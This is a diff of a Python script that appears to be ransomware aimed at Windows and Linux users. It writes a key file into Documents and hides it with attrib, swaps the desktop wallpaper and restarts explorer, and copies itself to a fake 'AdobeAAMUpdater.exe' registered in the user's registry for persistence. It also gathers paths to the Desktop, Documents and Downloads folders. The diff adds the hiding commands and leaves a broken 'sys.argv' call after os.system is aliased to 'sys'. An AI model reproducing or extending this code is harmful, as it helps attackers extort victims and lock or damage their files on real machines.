@@ -1,23 +1,24 @@
 from Func import Crypt
 from Func import k
-import os
-import platform
-import shutil
+from os import path,getenv
+from os import system as sys
+from platform import system
+from shutil import copyfile
 from winreg import *
 
-s = platform.system()
+s = system()
 
 if s=='Windows':
 	try:
-		desktop = os.path.expanduser('~/Desktop')
+		desktop = path.expanduser('~/Desktop')
 	except:
 		pass
 	try:
-		documents = os.path.expanduser('~/Documents')
+		documents = path.expanduser('~/Documents')
 	except:
 		pass
 	try:
-		downloads = os.path.expanduser('~/Downloads')
+		downloads = path.expanduser('~/Downloads')
 	except:
 		pass
 
@@ -25,6 +26,8 @@ if s=='Windows':
 		key = open(documents+'/.officek','wb')
 		key.write(k)
 		key.close()
+		sys('cd '+documents)
+		sys('attrib +s +h '+documents+'\\.officek')
 	except:
 		pass
 
@@ -34,11 +37,14 @@ if s=='Windows':
 		pass
 
 	try:
-		appdata = os.getenv('APPDATA')
+		appdata = getenv('APPDATA')
 		dest = appdata+"\\Microsoft\\Windows\\Themes"
-		shutil.copy(bg,dest+"\\TranscodedWallpaper")
-		system("taskkill /f /im explorer.exe")
-		system("start C:/Windows/explorer.exe")
+		copyfile(dest+'\\TranscodedWallpaper',dest+'\\.transold')
+		copyfile(bg,dest+"\\TranscodedWallpaper")
+		sys('cd '+dest)
+		sys('attrib +s +h '+dest+'\\.transold')
+		sys("taskkill /f /im explorer.exe")
+		sys("start C:/Windows/explorer.exe")
 	except:
 		pass
 
@@ -49,7 +55,7 @@ if s=='Windows':
 		key = CreateKey(HKEY_CURRENT_USER, keypath)
 	
 	try:
-		shutil.copy(sys.argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
+		copyfile(sys.argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
 		p = 'C:\\Users\\Public\\AdobeAAMUpdater.exe'
 		SetValueEx(key, "AdobeAAM", 0, REG_SZ, p)
 	except:
@@ -63,23 +69,23 @@ if s=='Windows':
 
 elif s=='Linux':
 	try:
-		desktop = os.path.expanduser('~/Desktop')
+		desktop = path.expanduser('~/Desktop')
 	except:
 		pass
 	try:
-		documents = os.path.expanduser('~/Documents')
+		documents = path.expanduser('~/Documents')
 	except:
 		pass
 	try:
-		downloads = os.path.expanduser('~/Downloads')
+		downloads = path.expanduser('~/Downloads')
 	except:
 		pass
 	try:
-		area = os.path.expanduser('~/Área de trabalho')
+		area = path.expanduser('~/Área de trabalho')
 	except:
 		pass
 	try:
-		documentos = os.path.expanduser('~/Documentos')
+		documentos = path.expanduser('~/Documentos')
 	except:
 		pass
 
